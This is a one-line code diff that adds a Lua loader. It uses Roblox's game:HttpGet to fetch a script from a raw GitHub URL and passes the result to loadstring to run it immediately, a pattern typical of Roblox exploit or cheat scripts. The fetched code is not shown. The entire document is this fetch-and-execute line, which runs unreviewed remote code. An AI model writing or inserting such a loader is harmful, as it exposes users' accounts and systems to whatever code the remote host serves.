@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/gikkax/new/main/77_ECEKVGC.lua'))()
